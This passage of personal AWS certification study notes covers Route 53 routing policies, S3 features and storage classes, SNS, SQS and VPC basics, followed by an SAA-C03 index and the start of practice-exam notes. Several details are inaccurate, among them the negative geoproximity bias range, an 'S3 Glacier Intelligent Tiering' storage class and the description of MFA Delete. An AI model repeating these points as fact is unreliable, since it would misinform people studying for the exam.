<li>You cannot create a CNAME for the Apex record (root domain)</li>
<li>Alias:</li>
<li>Points a hostname to an AWS Resource (app.mydomain.com =&gt; blabla.amazonaws.com)</li>
<li><ins>WORKS for ROOT DOMAIN and NON ROOT DOMAIN (aka, mydomain.com)
<ul>
<li>Free of charge</li>
<li>Native health check</li>
<li>Only supported for A and AAAA record types</li>
<li>Cannot set alias for an EC2 instance name</li>
</ul>
</ins></li>
</ul>
<h2 id="routing-policies"><a class="header" href="#routing-policies">Routing Policies</a></h2>
<ul>
<li>
<p><strong>Simple</strong></p>
<ul>
<li>Typically, the simple type of routing policy will resolve to a single resource</li>
<li>If the record resolves to multiple values, the client will choose a random one</li>
<li>When using the Alias record type, the record can only resolve to one resource</li>
</ul>
</li>
<li>
<p><strong>Weighted</strong></p>
<ul>
<li><strong><ins>Control the % of the requests that go to each specific resource.</ins></strong></li>
<li>Assign each record a relative weight
<ul>
<li>$ \text traffic {(%)} = {\displaystyle \text {weight for a specific record } \over \displaystyle \text {sum of all the weights for all records }} $</li>
<li>The sum of the weights of all records does not need to equal 100</li>
</ul>
</li>
<li>DNS records must have the same name and type</li>
<li>Can be associated with Health Checks</li>
<li>Use cases: load balancing between regions, testing new application versions<br><img src="clouds/aws/dva-c02/images/weighted-routing-policy.jpg" width="57%" /></li>
</ul>
</li>
<li>
<p><strong>Latency </strong></p>
<ul>
<li><ins>Redirect to the resource that has the <strong> least latency </strong>close to us </ins></li>
<li>Super helpful when latency for users is a priority</li>
<li>Latency is based on traffic between users and AWS Regions</li>
<li>Germany users may be directed to the US (if that‚Äôs the lowest latency)</li>
<li>Can be associated with Health Checks (has a failover capability)</li>
</ul>
</li>
<li>
<p><strong>Failover</strong>
<img src="clouds/aws/dva-c02/images/failover.jpg" width="57%" /></p>
</li>
<li>
<p><strong>Geolocation</strong></p>
<ul>
<li>Different from latency based</li>
<li><strong><i><ins>This routing is based on user location </ins></i></strong></li>
<li>Should <strong>create a ‚ÄúDefault‚Äù record </strong>(in case there‚Äôs no match on location)</li>
<li>Use cases: website localization, restrict content distribution, load balancing</li>
<li>Can be associated with Health Checks
<img src="clouds/aws/dva-c02/images/geolocation.jpg" width="57%" /></li>
</ul>
</li>
<li>
<p><strong> Geoproximity </strong></p>
<ul>
<li><strong><ins>Route traffic to your resources based on the location of users and resources </ins></strong></li>
<li>Ability to <ins>shift more traffic to resources based on the <strong>defined bias</strong></ins>
<img src="clouds/aws/dva-c02/images/geoproximity.jpg" width="57%" /></li>
<li>To change the size of the geographic region, specify bias values:
<ul>
<li>To expand (1 to 99)- more traffic to the resource</li>
<li>To shrink (-1 to 99)- less traffic to the resource
<img src="clouds/aws/dva-c02/images/geoproximity-higher-bias.jpg" width="57%" /></li>
</ul>
</li>
<li>Resources can be:
<ul>
<li>AWS resources (specify AWS region)</li>
<li>Non-AWS resources (specify Latitude and Longitude)</li>
</ul>
</li>
<li>You must use Route 53 Traffic Flow to use this feature</li>
</ul>
</li>
<li>
<p>Health Checks</p>
<ul>
<li>HTTP Health Checks are only for public resources. You must create a CloudWatch Metric and associate a CloudWatch Alarm, then create a Health Check that checks the alarm</li>
<li>15 global health checkers</li>
<li>Health checks methods:
<ul>
<li>Monitor an endpoint
<ul>
<li>Healthy/unhealthy threshold - 3 (default)</li>
<li>Interval 30 seconds</li>
<li>Supports HTTP, HTTPS, and TCP</li>
<li>if &gt; 18% of health checkers report the endpoint is healthy, Route53 considers it healthy.</li>
<li>You can choose which locations you want Route53 to use</li>
<li>You must configure the firewall to allow traffic from the health checkers</li>
</ul>
</li>
<li>Calculated Health Checks
<ul>
<li>Combine the results of multiple health checks into a single health check</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="configuring-amazon-route-53-to-route-traffic-to-an-s3-bucket"><a class="header" href="#configuring-amazon-route-53-to-route-traffic-to-an-s3-bucket">Configuring Amazon Route 53 to route traffic to an S3 Bucket</a></h2>
<ul>
<li>An S3 bucket that is configured to host a static website
<ul>
<li>You can route traffic for a domain and its subdomains, such as example.com and www.example.com to a single bucket.</li>
<li>Choose the bucket that has the same name that you specified for Record name</li>
<li>The name of the bucket is the same as the name of the record that you are creating</li>
<li>The bucket is configured as a website endpoint</li>
</ul>
</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="s3"><a class="header" href="#s3">S3</a></h1>
<h2 id="introduction-19"><a class="header" href="#introduction-19">Introduction</a></h2>
<ul>
<li>Storage</li>
<li>Files are stored in Buckets, the files are called objects</li>
<li>Storage Accounts must have a globally unique DNS name</li>
<li>Buckets are regional</li>
<li>Bucket names must have no uppercase, no underscore, 3-63 characters long, not an IP address, must start with a lowercase letter or number</li>
<li>Objects (files) have a key, which is the FULL path of the object:
<ul>
<li>Example of a prefix
<ul>
<li>bucket/folder1/subfolder1/mypic.jpg =&gt; prefix is /folder1/subfolder1/</li>
</ul>
</li>
</ul>
</li>
<li>S3 Select
<ul>
<li>Use SQL like language to only retrieve the data you need from S3 using server-side filtering</li>
</ul>
</li>
<li>Max object size is 5TB</li>
<li>If you upload a file larger than 5GB, you must use Multi-part Upload</li>
<li>Objects can have metadata</li>
</ul>
<h2 id="s3-security"><a class="header" href="#s3-security">S3 Security</a></h2>
<ul>
<li>
<p>User-Based</p>
<ul>
<li>IAM Policies - Which API calls are allowed for an IAM user</li>
</ul>
</li>
<li>
<p>Resource-Based</p>
<ul>
<li>Bucket Policies- bucket wide rules form the S3 Console - allows cross account</li>
<li>Object ACL - Finer grained (can be disabled)</li>
<li>Bucket ACL - less common (can be disabled)</li>
</ul>
</li>
<li>
<p>An IAM Principal can access an S3 object if:</p>
<ul>
<li>The user IAM permissions ALLOW it OR the resource policy allows it and there is no explicit Deny</li>
</ul>
</li>
<li>
<p>Bucket Policies - Bucket wide rules from the S3 console</p>
<ul>
<li>
<p>JSON based policy</p>
<pre><code>  {
      "Version": "2012-10-17",
      "Statement": [{
          "Sid": "AllowGetObject",
          "Principal": {
              "AWS": "*"
          },
          "Effect": "Allow",
          "Action": "s3:GetObject",
          "Resource": "arn:aws:s3:::DOC-EXAMPLE-BUCKET/*",
          "Condition": {
              "StringEquals": {
                  "aws:PrincipalOrgID": ["o-aa111bb222"]
              }
          }
      }]
  }
</code></pre>
</li>
<li>
<p>You can use the AWS Policy Generator to create JSON policies</p>
</li>
</ul>
</li>
</ul>
<h2 id="s3-static-website-hosting"><a class="header" href="#s3-static-website-hosting">S3 Static Website Hosting</a></h2>
<ul>
<li>You must enable public reads on the bucket</li>
</ul>
<h2 id="s3-versioning"><a class="header" href="#s3-versioning">S3 Versioning</a></h2>
<ul>
<li>
<p>allows to version the object</p>
</li>
<li>
<p>Stores all versions of an object in S3</p>
</li>
<li>
<div style="display:flex;"> Once enabled it cannot be disabled, only suspended on the bucket
<p><img src="clouds/aws/dva-c02/images/versioning-enable-feature.jpg" width="30%" height="70%" float="right" /> </p>
</div>
</li>
<li>
<p>Fully integrates with S3 Lifecycle rules</p>
</li>
<li>
<p>MFA Delete feature provides extra protection against deletion of your data</p>
  <img src="clouds/aws/dva-c02/images/versioning.jpg" width="50%" />
</li>
</ul>
<h2 id="s3-cross-region-replication-or-same-region-replication"><a class="header" href="#s3-cross-region-replication-or-same-region-replication">S3 Cross-Region Replication or Same-Region Replication</a></h2>
<ul>
<li>
<p>When enabled, any object that is uploaded will be <b> Automatically replicate </b> to another region or from source to destination buckets</p>
  <img src="clouds/aws/dva-c02/images/cross-region-replication.jpg" width="40%" height="70%" />
</li>
<li>
<p>Must have versioning turned on both the source and destination buckets.</p>
</li>
<li>
<p>Can have CRR replicate to another AWS account</p>
</li>
<li>
<p>Replicate objects within the same region</p>
</li>
<li>
<p>You must give proper IAM permissions to S3</p>
</li>
<li>
<p>Buckets can be in different AWS accounts</p>
</li>
<li>
<p>Only new objects are replicated after enabling replication. To replicate existing objects, you must use S3 Batch Replication</p>
</li>
<li>
<p>For DELETE operations, you can optionally replicate delete markers. Delete Markers are not replicated by default.</p>
</li>
<li>
<p>To replicate, you create a replication rule in the ‚ÄúManagement‚Äù tab of the S3 bucket. You can choose to replicate all objects in the bucket, or create a rule scope</p>
</li>
</ul>
<h2 id="s3-storage-classes"><a class="header" href="#s3-storage-classes">S3 Storage Classes</a></h2>
<ul>
<li>AWS offers a range of S3 Storage classes that<ins> trade Retrieval, Time, Accessability and Durability for Cheaper Storage </ins></li>
</ul>
<h3 id="descending-from-expensive-to-cheaper"><a class="header" href="#descending-from-expensive-to-cheaper">(Descending from expensive to cheaper)</a></h3>
<div style="display:flex;">
<img src="clouds/aws/dva-c02/images/cheaper.jpg" width="15%" height="1000/">
<p float="right">
<ul>
<li>
<p><b> S3 Standard (default) </b></p>
<ul>
<li>Fast! 99.99 % Availability,</li>
<li>11 9‚Äôs Durability. If you store 10,000,000 objects on S3, you can expect to lose a single object once every 10,000 years</li>
<li>Replicated across at least three AZs
<ul>
<li>S3 standard can sustain 2 concurrent facility failures</li>
</ul>
</li>
</ul>
</li>
<li>
<p><b> S3 Intelligent Tiering </b></p>
<ul>
<li>Uses ML to analyze object usage and determine the appropriate storage class</li>
<li>Data is moved to most cost-effective tier without any performance impact or added overhead</li>
</ul>
</li>
<li>
<p><b> S3 Standard-IA (Infrequent Access) </b></p>
<ul>
<li>Still Fast! Cheaper if you access files less than once a month</li>
<li><ins> Additional retrieval fee is applied</ins>. 50% less than standard (reduced availability)</li>
<li>99.9% Availability</li>
</ul>
</li>
<li>
<p><b> S3 One-Zone-IA </b></p>
<ul>
<li>Still fast! Objects only exist in one AZ.</li>
<li>Availability (is 99.5%). but cheaper than Standard IA by 20% less</li>
<li>reduces durability</li>
<li>Data could be destroyed</li>
<li>Retrieval fee is applied</li>
</ul>
</li>
<li>
<p><b> S3 Glacier Instant Retrieval</b></p>
<ul>
<li>Millisecond retrieval, great for data accessed once a quarter</li>
<li>Minimum storage duration of 90 days</li>
</ul>
</li>
<li>
<p><b> S3 Glacier Flexible Retrieval</b></p>
<ul>
<li>data retrieval: Expedited (1 to 5 minutes), Standard (3 to 5 hours), Bulk (5 to 12 hours) - free</li>
<li>minimum storage duration is 90 days</li>
<li>Retrieval of data can take minutes to hours but the off is <ins> very cheap storage </ins></li>
</ul>
</li>
<li>
<p><b> S3 Glacier Deep Archive</b></p>
<ul>
<li>The lowest cost storage class - Data retrieval time is 12 hours</li>
<li>standard (12 hours), bulk (48 hours)</li>
<li>Minimum storage duration is 180 days</li>
</ul>
</li>
<li>
<p><b> S3 Glacier Intelligent Tiering</b></p>
</li>
</ul>
</p>

</div>

<hr>
<ul>
<li>
<p>Storage class comparison</p>
  <img src="clouds/aws/dva-c02/images/storage-class-comparison.jpg" width="70%" height="70%" />
</li>
<li>
<p>S3 Guarantees:</p>
<ul>
<li>Platform is built for 99.99% availability</li>
<li>Amazon guarantee 99.99% availability</li>
<li>Amazon guarantees 11‚Äô9s of durability</li>
</ul>
</li>
</ul>
<h2 id="s3-lifecycle-rules"><a class="header" href="#s3-lifecycle-rules">S3 LifeCycle Rules</a></h2>
<ul>
<li>Types of rules:
<ul>
<li>Transition Actions
<ul>
<li>Move objects between storage classes automatically</li>
</ul>
</li>
<li>Expiration Actions
<ul>
<li>Configure objects to expire (delete) after some time</li>
<li>Can be used to delete incomplete multi-part uploads</li>
<li>Delete access logs automatically</li>
<li>Can be used to delete old versions of files if versioning is enabled</li>
</ul>
</li>
</ul>
</li>
<li>Rules can be specified for objects with a certain prefix or tag</li>
</ul>
<h2 id="event-notifications"><a class="header" href="#event-notifications">Event Notifications</a></h2>
<ul>
<li>Examples of events:
<ul>
<li>S3:ObjectCreated, S3:ObjectRemoved, S3:ObjectRestore</li>
</ul>
</li>
<li>Object name filtering is possible (*.jpg for example)</li>
<li>Send a notification when an event occurs</li>
<li>Uses SNS, Lambda, or SQS to send the notifications to
<ul>
<li>Requires a SNS Resource Policy, SQS Resource Policy, or a Lambda Resource Policy allowing S3 bucket to write to the resource</li>
</ul>
</li>
<li>You can also send events to EventBridge, which can then be used to send the events to 18 other AWS services</li>
</ul>
<h2 id="s3-encryption"><a class="header" href="#s3-encryption">S3 Encryption</a></h2>
<ul>
<li>4 types of encryption in S3
<ul>
<li>Server side encryption with managed keys (SSE-S3)
<ul>
<li>Key is completely managed by AWS, you never see it</li>
<li>Object is encrypted server-side</li>
<li>Enabled by default
<ul>
<li>Uses AES-256, must set header <code>"x-amz-server-side-encryption": "AES256"</code></li>
</ul>
</li>
</ul>
</li>
<li>Server side encryption with KMS keys stored in AWS KMS (SSE-KMS)
<ul>
<li>Manage the key yourself, store the key in KMS</li>
<li>You can audit the key use in CloudTrail
<ul>
<li>Uses AES-256, must set header <code>"x-amz-server-side-encryption": "AWS:KMS"</code></li>
</ul>
</li>
<li>Accessing the key counts toward your KMS Requests quota (5500, 10000, 30000 rps, based on region)
<ul>
<li>You can request a quota increase from AWS</li>
</ul>
</li>
</ul>
</li>
<li>Server Side Encryption with customer provided keys (SSE-C)
<ul>
<li>Can only be enabled/disabled from the AWS CLI</li>
<li>AWS doesn‚Äôt store the encryption key you provide</li>
<li>The key must be passed as part of the headers with every request you make</li>
<li>HTTPS must be used</li>
</ul>
</li>
<li>CSE (Client side encryption)
<ul>
<li>Clients encrypt/decrypt all the data before sending any data to S3</li>
<li>Customer fully managed the keys and encryption lifecycle</li>
</ul>
</li>
</ul>
</li>
<li>Encryption in Transit
<ul>
<li>Traffic between local host and S3 is achieved via <b> SSL/TLS</b></li>
</ul>
</li>
</ul>
<h2 id="mfa-delete"><a class="header" href="#mfa-delete">MFA Delete</a></h2>
<ul>
<li><b> MFA Delete</b> ensures users cannot delete objects from a bucket unless they provide their MFA code.
<img src="clouds/aws/dva-c02/images/mfa-delete.jpg" width="50%" height="30%" /></li>
<li>MFA delete can only be enabled under these conditions
<ol>
<li>The AWS CLI must be used to turn on MFA delete</li>
<li>The bucket must have versioning enabled
<img src="clouds/aws/dva-c02/images/mfa-delete-log.jpg" width="50%" height="30%" /></li>
</ol>
</li>
<li>Only the bucket owner logged in as <ins><b>Root User</b></ins> can <b>DELETE</b> objects from bucket</li>
</ul>
<h2 id="presigned-urls"><a class="header" href="#presigned-urls">Presigned URLs</a></h2>
<ul>
<li>
<p>Generates a URL which provides temporary access to an object to either upload or download object data.</p>
</li>
<li>
<p>The pre-signed URL inherites the permission of the user that created the pre-signed URL</p>
</li>
<li>
<p>Presigned Urls are commonly used to <ins> provide access to <b> private objects </b></ins></p>
</li>
<li>
<p>Can use AWS CLI or AWS SDK to generate Presigned Urls
<img src="clouds/aws/dva-c02/images/presigned-urls.jpg" width="50%" height="30%" /></p>
</li>
<li>
<p>If in case a web-application which need to allow users to download files from a password protected part of the web-app. Then the web-app generates presigned url which expires after 5 seconds. The user downloads the file.</p>
</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="simple-notification-system"><a class="header" href="#simple-notification-system">Simple Notification System</a></h1>
<h2 id="introduction-20"><a class="header" href="#introduction-20">Introduction</a></h2>
<ul>
<li>Pub/sub system</li>
<li>The ‚Äúevent producer‚Äù only sends messages to one SNS topic</li>
<li>As many subscribers as we want to listen to the SNS topic notifications</li>
<li>Each subscriber to the topic will get all of the messages (new feature to filter messages)</li>
<li>Up to 12,500,000 subscriptions per topic</li>
<li>100,000 topic limit</li>
<li>Subscribers can be:
<ul>
<li>SQS, Lambda, Kinesis Data Firehose, Emails, SMS, etc.</li>
</ul>
</li>
<li>Publishers can be:
<ul>
<li>CloudWatch, Budgets, S3 Event Notifications, any many more‚Ä¶</li>
</ul>
</li>
</ul>
<h2 id="how-to-publish"><a class="header" href="#how-to-publish">How to publish</a></h2>
<ul>
<li>Topic Publish (using the SDK)
<ul>
<li>Create a topic</li>
<li>Create a subscription (or many)</li>
<li>Publish to the topic</li>
</ul>
</li>
<li>Direct Publish (for mobile apps SDK)
<ul>
<li>Create a platform application</li>
<li>Create a platform endpoint</li>
<li>Publish to the platform endpoint</li>
<li>Works with Google GCM, Apple APNS, Amazon ADM, etc.</li>
</ul>
</li>
</ul>
<h2 id="sns--sqs-fan-out"><a class="header" href="#sns--sqs-fan-out">SNS + SQS: Fan Out</a></h2>
<ul>
<li>Concept: Push once in SNS, receive in all SQS queues that are subscribers</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="simple-queue-system"><a class="header" href="#simple-queue-system">Simple Queue System</a></h1>
<h2 id="introduction-21"><a class="header" href="#introduction-21">Introduction</a></h2>
<ul>
<li>When you deploy an application, it will communicate in one of two ways
<ul>
<li>Synchronous: Applications talk directly to each other</li>
<li>Asynchronous: Applications use some type of ‚Äòmiddle-man‚Äô to communicate, such as a queue</li>
</ul>
</li>
<li>A queue can have multiple producers and multiple consumers</li>
<li>SQS offers unlimited throughput and unlimited messages, with less than 10 ms latency</li>
<li>SQS is the oldest service provided by AWS</li>
<li>The default TTL of a message in the queue is 4 days and the maximum is 14 days</li>
<li>Messages must be less than 256 KB</li>
<li>SQS can have duplicate messages and messages may be delivered out of order</li>
</ul>
<h2 id="producing-messages"><a class="header" href="#producing-messages">Producing Messages</a></h2>
<ul>
<li>Messages are sent to SQS using the <code>SendMessage</code> API</li>
<li>The message is persisted until a consumer deletes it, unless the TTL expires</li>
</ul>
<h2 id="consuming-messages"><a class="header" href="#consuming-messages">Consuming Messages</a></h2>
<ul>
<li>An application you write. Can be hosted anywhere (AWS, on-prem, etc.)</li>
<li>The consumer will poll the queue for new messages and receive up to 10 messages at a time</li>
<li>Consumers need to delete messages after processing them, otherwise other consumers may receive the messages</li>
<li>You can create a EC2 ASG to pull the CloudWatch Metric ‚ÄúQueue Length‚Äù and scale in/out based on the value of the metric
<ul>
<li>This metric value is the number of messages in a queue</li>
</ul>
</li>
</ul>
<h2 id="sqs-queue-access-policy"><a class="header" href="#sqs-queue-access-policy">SQS Queue Access Policy</a></h2>
<ul>
<li>You can allow an EC2 instance in a different AWS account to access a queue using an SQS access policy</li>
<li>You can use an access policy to allow an S3 bucket to write to an SQS queue using Event Notifications
<img src="clouds/aws/dva-c02/images/sqs-access-policy.png" width="77%" height="40%" /></li>
</ul>
<h2 id="message-visibility-timeout"><a class="header" href="#message-visibility-timeout">Message Visibility Timeout</a></h2>
<ul>
<li>After a message is polled by a consumer, it becomes invisible to other consumers</li>
<li>By default, the message is invisible to other consumers for 30 seconds</li>
<li>If a message is not processed within the visibility timeout, it may be processed twice. Your application can change this behavior by calling the <code>ChangeMessageVisibility</code> API</li>
</ul>
<h2 id="dead-letter-queues"><a class="header" href="#dead-letter-queues">Dead letter Queues</a></h2>
<ul>
<li>If a consumer fails to process a message within the Visibility Timeout, the message goes back to the queue.</li>
<li>We can set a threshold of how many times the message can go back into the queue</li>
<li>After the <code>MaximumRecieves</code> threshold is exceeded, the message goes into a dead letter queue (DLQ)</li>
<li>The Dead letter queue of a FIFO queue must also be a FIFO queue</li>
<li>The dead letter queue of a standard queue must also be a standard queue</li>
</ul>
<h2 id="fifo-queues"><a class="header" href="#fifo-queues">FIFO Queues</a></h2>
<ul>
<li>First in, first out</li>
<li>Messages are ordered in the queue, first message to arrive is the first message to leave</li>
<li>The name of the queue must end in ‚Äò.fifo‚Äô</li>
<li>De-duplication
<ul>
<li>default de-duplication interval is 5 minutes</li>
<li>Two de-duplication methods:
<ul>
<li>Content based de-duplication: will hash the message body and compare</li>
<li>Explicitly provide a Message De-duplication Id</li>
</ul>
</li>
</ul>
</li>
<li>Message Grouping</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="vpc"><a class="header" href="#vpc">VPC</a></h1>
<h2 id="introduction-22"><a class="header" href="#introduction-22">Introduction</a></h2>
<ul>
<li>VPC is a private network within AWS</li>
<li>VPC‚Äôs can contain one or more subnets</li>
<li>A public subnet is a subnet that is accessible from the internet</li>
<li>To define access to the internet and between subnets, use route tables</li>
</ul>
<h2 id="internet-gateway-and-nat-gateway"><a class="header" href="#internet-gateway-and-nat-gateway">Internet Gateway and NAT Gateway</a></h2>
<ul>
<li>Internet gateways help the VPC connect to the internet</li>
<li>Public subnets have a route to the internet gateway</li>
<li>NAT gateways and NAT instances (self-managed) allow your instances in your private subnet to <em>access the internet while remaining private</em></li>
</ul>
<h2 id="network-acl-and-security-groups"><a class="header" href="#network-acl-and-security-groups">Network ACL and Security Groups</a></h2>
<ul>
<li>NACL is a firewall rule list which allows or denies traffic to and from a subnet</li>
<li>NACL‚Äôs are attached at the subnet level</li>
<li>NACL‚Äôs are stateless, meaning an inbound rule needs to have a matching outbound rule</li>
<li>Security groups are a firewall rule list that controls traffic to and from an EC2 instance</li>
<li>Security groups can only contain allow rules</li>
<li>Security group rules can contain IP addresses/ranges or other Security Groups</li>
</ul>
<h2 id="vpc-flow-logs"><a class="header" href="#vpc-flow-logs">VPC Flow Logs</a></h2>
<ul>
<li>Flow logs log traffic into a VPC, subnet, or Elastic Network Interface</li>
<li>3 Types of flow logs
<ul>
<li>VPC Flow Logs</li>
<li>Subnet Flow Logs</li>
<li>ENI Flow Logs</li>
</ul>
</li>
<li>Log data can be sent to S3, CloudWatch Logs, and Kinesis Data Firehouse</li>
</ul>
<h2 id="vpc-peering"><a class="header" href="#vpc-peering">VPC Peering</a></h2>
<ul>
<li>Connect two VPC, privately over the AWS backbone network</li>
<li>The two VPCs must not have overlapping CIDR blocks</li>
<li>VPC peering is not transitive
<img src="clouds/aws/dva-c02/images/vpc-peering.jpg" width="57%" /></li>
</ul>
<h2 id="vpc-endpoints"><a class="header" href="#vpc-endpoints">VPC Endpoints</a></h2>
<ul>
<li>Endpoints allow you to connect to AWS Services using a private network instead of the public network</li>
<li>Gives you enhanced security and lower latency accessing AWS services
<img src="clouds/aws/dva-c02/images/vpc-endpoints.jpg" width="57%" /></li>
</ul>
<h2 id="site-to-site-vpc"><a class="header" href="#site-to-site-vpc">Site to Site VPC</a></h2>
<ul>
<li>Establish a physical connection between AWS and on-premises</li>
<li>Goes over the public internet
<img src="clouds/aws/dva-c02/images/site-to-site-vpn.jpg" width="57%" /></li>
</ul>
<h2 id="direct-connect"><a class="header" href="#direct-connect">Direct Connect</a></h2>
<ul>
<li>Establish a physical connection between AWS and on-premises</li>
<li>Goes over a private network</li>
<li>Requires infrastructure to be put in place
<img src="clouds/aws/dva-c02/images/direct-connect.jpg" width="57%" /></li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="aws-solutions-architect-associate-notes"><a class="header" href="#aws-solutions-architect-associate-notes">AWS-Solutions-Architect-Associate-notes</a></h1>
<p>This is a collection of study material and follows through guidelines of the AWS Certified Solutions Architect - Associate exam (SAA-C03) exam.</p>
<h1 id="exam-guide"><a class="header" href="#exam-guide">Exam Guide</a></h1>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Domain</th><th>% of Exam</th></tr>
</thead>
<tbody>
<tr><td>Domain 1: Design Secure Architectures</td><td>30%</td></tr>
<tr><td>Domain 2: Design Resilient Architectures</td><td>26%</td></tr>
<tr><td>Domain 3: Design High-Performing Architectures</td><td>24%</td></tr>
<tr><td>Domain 4: Design Cost-Optimized Architectures</td><td>20%</td></tr>
<tr><td>TOTAL</td><td>100%</td></tr>
</tbody>
</table>
</div>
<h2 id="directory-map-3"><a class="header" href="#directory-map-3">Directory Map</a></h2>
<ul>
<li><a href="clouds/aws/saa-c03/APIGateway">APIGateway</a>
<ul>
<li><a href="#api-gateway-cheatsheet">api-gateway-cheatsheet</a></li>
</ul>
</li>
<li><a href="clouds/aws/saa-c03/Application-Integration">Application-Integration</a>
<ul>
<li><a href="#queueing-sqs-1">application-integration</a></li>
</ul>
</li>
<li><a href="clouds/aws/saa-c03/CloudFront">CloudFront</a>
<ul>
<li><a href="#cloudfront-3">cloudfront</a></li>
<li><a href="#cloudfront-cheatsheet">cloudfront-cheatsheet</a></li>
</ul>
</li>
<li><a href="clouds/aws/saa-c03/Database">Database</a>
<ul>
<li><a href="#what-is-database--1">database</a></li>
</ul>
</li>
<li><a href="clouds/aws/saa-c03/Disaster-Recovery-Migrations">Disaster-Recovery-Migrations</a>
<ul>
<li><a href="#disaster-recovery">disaster-recover-migrations</a></li>
<li><a href="#disaster-recovery-cheatsheet">disaster-recovery-cheatsheet</a></li>
</ul>
</li>
<li><a href="clouds/aws/saa-c03/EC2">EC2</a>
<ul>
<li><a href="#ec2-3">Ec2</a></li>
<li><a href="#savings-plan-1">ec2-pricing</a></li>
<li><a href="#elastic-load-balancer-1">elb</a></li>
</ul>
</li>
<li><a href="clouds/aws/saa-c03/EFS">EFS</a>
<ul>
<li><a href="#elastic-file-system-efs-1">efs</a></li>
</ul>
</li>
<li><a href="clouds/aws/saa-c03/ElastiCache">ElastiCache</a>
<ul>
<li><a href="#what-is-elasticache-for-redis-1">elasticache</a></li>
</ul>
</li>
<li><a href="clouds/aws/saa-c03/Glue">Glue</a>
<ul>
<li><a href="#glue-cheatsheet">glue-cheatsheet</a></li>
</ul>
</li>
<li><a href="clouds/aws/saa-c03/Lambda">Lambda</a>
<ul>
<li><a href="#aws-lambda-1">lambda</a></li>
</ul>
</li>
<li><a href="clouds/aws/saa-c03/Machine-Learning-Models">Machine-Learning-Models</a>
<ul>
<li><a href="#ml-models">ml-models</a></li>
</ul>
</li>
<li><a href="clouds/aws/saa-c03/Monitoring-and-Audit">Monitoring-and-Audit</a>
<ul>
<li><a href="clouds/aws/saa-c03/Monitoring-and-Audit/monitoring-and-audit">monitoring-and-audit</a></li>
</ul>
</li>
<li><a href="clouds/aws/saa-c03/Quicksight">Quicksight</a>
<ul>
<li><a href="#what-is-amazon-quicksight--1">quicksight</a></li>
</ul>
</li>
<li><a href="clouds/aws/saa-c03/RDS-and-Aurora">RDS-and-Aurora</a>
<ul>
<li><a href="#aurora-cheatsheet-1">aurora-cheatsheet</a></li>
<li><a href="#rds-2">rds-and-aurora</a></li>
</ul>
</li>
<li><a href="clouds/aws/saa-c03/Redshift">Redshift</a>
<ul>
<li><a href="#amazon-redshift-1">redshift</a></li>
</ul>
</li>
<li><a href="clouds/aws/saa-c03/Route53">Route53</a>
<ul>
<li><a href="#dns-4">route53</a></li>
</ul>
</li>
<li><a href="clouds/aws/saa-c03/security">security</a>
<ul>
<li><a href="#iam-1">iam</a></li>
<li><a href="#aws-certificate-manager">security</a></li>
</ul>
</li>
<li><a href="clouds/aws/saa-c03/Storage">Storage</a>
<ul>
<li><a href="#introduction-to-s3-1">storage</a></li>
<li><a href="#storage-cheatsheet">storage-cheatsheet</a></li>
</ul>
</li>
<li><a href="clouds/aws/saa-c03/VPC">VPC</a>
<ul>
<li><a href="clouds/aws/saa-c03/VPC/nacl-cheatsheet">nacl-cheatsheet</a></li>
<li><a href="#introduction-to-vpc-1">vpc</a></li>
<li><a href="#vpc-endpoint-cheatsheet">vpc-endpoint-cheatsheet</a></li>
<li><a href="#vpc-flow-logs-cheatsheet">vpc-flow-logs-cheatsheet</a></li>
</ul>
</li>
</ul>
<h2 id="table-of-contents-3"><a class="header" href="#table-of-contents-3">Table of Contents</a></h2>
<ul>
<li><a href="clouds/aws/saa-c03/Storage/storage.md.html">Storage</a></li>
<li><a href="#introduction-to-vpc-1">VPC</a></li>
<li><a href="#cloudfront-3">CLoudFront</a></li>
<li><a href="#aws-lambda-1">AWS Lambda</a></li>
<li><a href="#rds-2">RDS and Aurora</a></li>
<li><a href="#amazon-redshift-1">Redshift</a></li>
<li><a href="clouds/aws/saa-c03/Ec2-Pricing/Ec2.html">EC2</a></li>
<li><a href="clouds/aws/saa-c03/Ec2-Pricing/ec2-pricing.html">EC2 Pricing</a></li>
<li><a href="#elastic-file-system-efs-1">EFS</a></li>
<li><a href="#what-is-elasticache-for-redis-1">ElastiCache for Redis</a></li>
<li><a href="#queueing-sqs-1">Application Integration</a></li>
<li><a href="#what-is-amazon-quicksight--1">QuickSight</a></li>
<li><a href="#disaster-recovery">Disaster Recovery Migrations</a></li>
<li><a href="#dns-4">Route 53</a></li>
</ul>
<h2 id="cheatsheets-1"><a class="header" href="#cheatsheets-1">CheatSheets</a></h2>
<ul>
<li><a href="#storage-cheatsheet">Storage cheat sheet</a></li>
<li><a href="#vpc-endpoint-cheatsheet">VPC Endpoint</a></li>
<li><a href="#vpc-flow-logs-cheatsheet">VPC FLow Logs</a></li>
<li><a href="clouds/aws/saa-c03/VPC/nacl-cheatsheet">NACL</a></li>
<li><a href="#cloudfront-cheatsheet">CloudFront</a></li>
<li><a href="clouds/aws/saa-c03/Aurora/aurora-cheatsheet.html">Aurora</a></li>
<li><a href="#glue-cheatsheet">Glue</a></li>
<li><a href="#api-gateway-cheatsheet">API Gateway</a></li>
<li><a href="#disaster-recovery-cheatsheet">Disaster Recovery Migrations</a></li>
<li><a href="#table-of-contents-10">Overview</a></li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="aws-certified-solutions-architect-associate-practice-exams"><a class="header" href="#aws-certified-solutions-architect-associate-practice-exams">AWS Certified Solutions Architect Associate Practice Exams</a></h1>
<p><img src="https://img-c.udemycdn.com/course/480x270/1520628_21fa_4.jpg" alt=""></p>
<h3 id="metadata"><a class="header" href="#metadata">Metadata</a></h3>
<ul>
<li>Title: AWS Certified Solutions Architect Associate Practice Exams</li>
<li>URL: https://www.udemy.com/course/aws-certified-solutions-architect-associate-amazon-practice-exams-saa-c03/learn/quiz/4394972/result/1100741372</li>
</ul>
<h3 id="highlights--notes"><a class="header" href="#highlights--notes">Highlights &amp; Notes</a></h3>
<ul>
<li>
<p>In Auto Scaling, the following statements are correct regarding the cooldown period:  It ensures that the Auto Scaling group does not launch or terminate additional EC2 instances before the previous scaling activity takes effect.  Its default value is 300 seconds.  It is a configurable setting for your Auto Scaling group.</p>
</li>
<li>
